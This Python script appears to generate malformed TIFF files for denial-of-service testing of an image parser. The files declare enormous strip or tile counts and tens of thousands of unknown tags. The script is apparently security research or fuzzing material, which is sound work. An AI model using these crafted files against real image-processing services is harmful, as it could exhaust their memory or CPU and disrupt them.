import sys, struct, zlib
sys.path.insert(0, sys.argv[1])
from tiffcraft import *
out = sys.argv[2]
def w(name, data):
    open(f'{out}/{name}', 'wb').write(data); print(name, len(data))

# D1: huge strip count from geometry: 1 x H, rowsperstrip 1, offsets/bytecounts with count 1
for h, name in [(0x7FFFFFFF, 'dos-nstrips-2G.tif'), (0x10000000, 'dos-nstrips-256M.tif'), (0x04000000, 'dos-nstrips-64M.tif')]:
    d, _ = build(basic(1, h, rps=1, offsets=[8], counts=[1]), payload=b'\x00\x00')
    w(name, d)
# D1-short: SHORT offset type (other code path)
d, _ = build(basic(1, 0x10000000, rps=1, offsets=[8], counts=[1], off_type=3, cnt_type=3), payload=b'\x00\x00'); w('dos-nstrips-256M-short.tif', d)
# D2: tiled, 16x16 tiles, 2^28 tiles
e = basic(16*16384, 16*16384, offsets=[8], counts=[1]) + [entry(322, 4, [16]), entry(323, 4, [16]), entry(324, 4, [8]), entry(325, 4, [1])]
e = [x for x in e if x[0] not in (273, 279)]
d, _ = build(e, payload=b'\x00\x00'); w('dos-ntiles-256M.tif', d)
# D3: planar separate with spp=65535, multiply strips
d, _ = build(basic(1, 32768, spp=1, rps=1, offsets=[8], counts=[1], planar=2, extra=[]), payload=b'\x00\x00')
# D4: many unknown tags (unique ids), unsorted -> MergeFieldInfo per tag
for n, name in [(5000, 'dos-unknowntags-5k.tif'), (20000, 'dos-unknowntags-20k.tif'), (60000, 'dos-unknowntags-60k.tif')]:
    e = basic(1, 1, offsets=[8], counts=[1])
    tags = [t for t in range(400, 65535) if t not in range(400, 65535)[:0]]
    used = {x[0] for x in e}
    import random
    random.seed(1)
    cand = [t for t in range(1000, 65535) if t not in used and not (32768 <= t <= 34000) and not (36000 <= t <= 42500) and t not in (50706,50707,50708)]
    random.shuffle(cand)
    for t in cand[:n]:
        e.append(entry(t, 3, [1]))
    d, _ = build(e, payload=b'\x00\x00', sort=False); w(name, d)
    d, _ = build(e, payload=b'\x00\x00', sort=True); w(name.replace('.tif', '-sorted.tif'), d)
